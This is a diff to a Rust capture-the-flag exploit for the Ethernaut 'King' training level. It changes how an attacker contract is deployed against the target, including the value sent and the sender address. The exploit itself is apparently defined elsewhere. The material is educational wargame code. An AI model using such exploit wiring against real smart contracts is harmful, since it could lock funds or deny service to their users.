@@ -5,7 +5,6 @@
 //!
 //! https://github.com/OpenZeppelin/ethernaut/blob/d05643a/contracts/src/levels/King.sol
 
-use alloy::primitives::U256;
 use async_trait::async_trait;
 use ctf::Actor;
 use ctf::ethereum::ethernaut::lvl09_king::*;
@@ -29,10 +28,13 @@ impl ctf::Exploit for Exploit {
     ) -> eyre::Result<()> {
         let contract = King::new(target.address, offender.provider());
         let prize = contract.prize().call().await?;
+
         KingExploit::deploy_builder(offender.provider(), target.address)
-            .value(prize + U256::ONE)
+            .from(offender.address())
+            .value(prize)
             .deploy()
             .await?;
+
         Ok(())
     }
 }
